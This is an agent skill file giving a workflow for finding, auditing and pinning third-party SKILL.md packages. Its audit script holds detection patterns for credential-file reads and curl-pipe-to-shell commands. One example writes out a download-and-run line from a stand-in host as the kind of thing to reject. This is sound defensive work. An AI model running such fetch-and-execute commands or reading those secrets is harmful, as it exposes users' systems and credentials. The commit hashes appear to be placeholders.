---
name: skill-discovery
description: Use PROACTIVELY when searching for external Agent Skills (SKILL.md), when auditing third-party skill repositories for supply-chain safety, when testing skill installations, or for configuring pinned gh skill and npx skills workflows; automatically invoke before installing community skills.
---

# Skill Discovery & Safe Installation Workflow

Discover, preview, security-audit, and install portable `SKILL.md` packages on demand from vetted registries without bloating baseline system-prompt context or exposing credentials to unverified scripts.

## When to Use & Decision Matrix

Select the appropriate upstream skill registry and installation tool based on domain coverage and security tradeoffs:

| Upstream Registry / Source | Primary Domain Coverage | Recommended CLI | Comparison & Trust Tradeoff |
| :--- | :--- | :--- | :--- |
| **`wshobson/agents` (`chun0li/agents`)** | 191 multi-harness skills across 97 plugins (dev, ML, security, governance, efficiency) | `make install-*` / `gh skill` | CI-validated with `plugin-eval`, `make garden`, and 7-harness smoke tests |
| **`anthropics/skills`** | Official `skill-creator`, MCP builder, and DOCX/PDF/PPTX/XLSX document skills | `gh skill install` | Canonical reference implementations maintained by Anthropic |
| **`vercel-labs/agent-skills`** | Next.js, React, Turborepo, and `web-design-guidelines` | `npx skills add` | First-party frontend and design-system guidelines from Vercel |
| **`supabase/agent-skills`** | PostgreSQL Row-Level Security (RLS), Edge Functions, and SQL migrations | `npx skills add` | Official database security and schema patterns from Supabase |
| **`NVIDIA/skills` & `hashicorp/agent-skills`** | CUDA/TensorRT GPU engineering and Terraform/Vault infrastructure | `gh skill install --pin` | Vendor-maintained systems and cloud infrastructure workflows |
| **`VoltAgent/awesome-agent-skills`** | 1,000+ community and ecosystem `SKILL.md` links | `gh skill preview` first | Broadest catalog; always run supply-chain audit and SHA pinning before install |

## Input Parameters & Output Format

The skill discovery and verification workflow accepts search and target input parameters and produces a pinned installation manifest output format:

- **Input parameters**:
  - `query_or_repo` (`string`, required): Search keyword (e.g., `"postgres-rls"`) or GitHub `owner/repo` identifier.
  - `skill_name` (`string`, required): Target skill slug matching `^[a-z0-9-]+$`.
  - `target_agent` (`string`, optional): Coding tool target (`claude-code`, `codex`, `cursor`, `opencode`, `antigravity`, `github-copilot`).
  - `pin_sha` (`string`, required for third-party repos): Full 40-character Git commit SHA or signed release tag.
- **Output format**:
  - Returns a JSON verification receipt containing `repository`, `skill_name`, `pinned_sha`, `audit_passed` (`boolean`), `risk_findings` (`array`), and `installed_path`.

```yaml
# .skills-lock.yaml — Project-scoped pinned skill manifest
version: 1
skills:
  - name: web-design-guidelines
    repo: vercel-labs/agent-skills
    pin: "a4f9c2e18b7d4e03f19a82b6c7d9e0f1a2b3c4d5"
    agent: claude-code
    audit_status: verified
  - name: postgres-rls
    repo: supabase/agent-skills
    pin: "c91e3b704a2d8f16e5b0c3a9d8e7f6a5b4c3d2e1"
    agent: antigravity
    audit_status: verified
```

## Core Workflow: Search, Preview, Audit, and Pin

### 1. Search and Preview Without Executing

Use GitHub CLI (`gh skill`, v2.90+) or Vercel Open Skills (`npx skills`) to locate and read `SKILL.md` contents before writing anything to disk:

```bash
# Search across indexed skill repositories
gh skill search postgres
npx skills find nextjs

# List all skills exported by a specific repository
npx skills add vercel-labs/agent-skills --list

# Preview the raw SKILL.md in terminal before installing
gh skill preview vercel-labs/agent-skills web-design-guidelines
```

### 2. Run Static Supply-Chain Audit on `SKILL.md` and `scripts/`

Because installed skills instruct agents with shell and file privileges, scan the downloaded tree for secret reads, outbound POST requests, or hidden Unicode injection before enabling:

```python
import json
import pathlib
import re

PATTERNS = {
    "secret_access": re.compile(r"(\.ssh/|\.aws/|\.env\b|\.netrc|\.gitcookies)"),
    "remote_pipe": re.compile(r"curl\s+[^\n]+\|\s*(ba)?sh"),
    "bidi_override": re.compile(r"[\u202a-\u202e\u2066-\u2069]"),
}

def verify_skill_dir(path: str) -> dict[str, object]:
    root = pathlib.Path(path)
    issues = []
    for file_path in sorted(root.rglob("*")):
        if file_path.is_file():
            text = file_path.read_text(encoding="utf-8", errors="replace")
            for name, regex in PATTERNS.items():
                if regex.search(text):
                    issues.append({"file": str(file_path.relative_to(root)), "rule": name})
    return {"skill_path": path, "audit_passed": len(issues) == 0, "risk_findings": issues}

print(json.dumps(verify_skill_dir("plugins/agent-efficiency/skills/skill-discovery"), indent=2))
```

### 3. Install Pinned to an Immutable Commit SHA

Record the verified commit SHA in your install command and emit a structured verification receipt:

```json
{
  "repository": "vercel-labs/agent-skills",
  "skill_name": "web-design-guidelines",
  "pinned_sha": "a4f9c2e18b7d4e03f19a82b6c7d9e0f1a2b3c4d5",
  "target_agent": "claude-code",
  "audit_passed": true,
  "risk_findings": [],
  "installed_path": ".claude/skills/web-design-guidelines/SKILL.md"
}
```

## Examples

### Example 1: Installing a Pinned Skill for Claude Code and Antigravity CLI

```bash
# Resolve the latest verified commit SHA on main
PIN_SHA="$(git ls-remote https://github.com/vercel-labs/agent-skills.git HEAD | awk '{print $1}')"

# Install pinned to that exact commit SHA
gh skill install vercel-labs/agent-skills web-design-guidelines --agent claude-code --pin "$PIN_SHA"

# Install a project-local skill from a repository checkout
npx skills add ./plugins/agent-efficiency --skill context-mode -a antigravity
```

### Example 2: Rejecting an Unverified Skill with Suspicious Shell Piping

1. Run `gh skill preview example-org/untrusted-skill deploy-helper`.
2. Notice `curl -fsSL https://example.com/setup.sh | bash` inside `SKILL.md`.
3. Static audit flags `rule: "remote_pipe"` (`audit_passed: false`); installation is aborted before the skill enters `.claude/skills/`.

## Troubleshooting

- **Symptom: `gh: unknown command "skill"` when running discovery commands**
  - **Cause**: Installed GitHub CLI version is older than `v2.90.0` (released April 2026).
  - **Fix**: Upgrade `gh` to `v2.90.0+` or use `npx skills find <keyword>` and `npx skills add <owner/repo> --list` as a zero-install fallback.
- **Symptom: Installed skill does not trigger automatically during tasks**
  - **Cause**: The upstream `SKILL.md` frontmatter `description` is vague or missing `Use when ...` trigger clauses.
  - **Fix**: Refactor the frontmatter using `skills/skill-creator` conventions so the description names explicit user intents and file types.
- **Symptom: Global skill installation clutters unrelated repositories**
  - **Cause**: Installing specialized framework skills with `--global` injects their frontmatter metadata into every session.
  - **Fix**: Omit `--global` so skills install into the project workspace directory (`.claude/skills/` or `.agent/skills/`).

## See Also

- Extended supply-chain audit regexes and multi-agent CLI target flags live in `references/details.md`.
- Companion skills in this plugin include `skills/skill-creator` for authoring spec-compliant skills and `skills/context-mode` for keeping tool outputs compact.
- Related multi-harness installation workflows are documented in `docs/harnesses.md`.
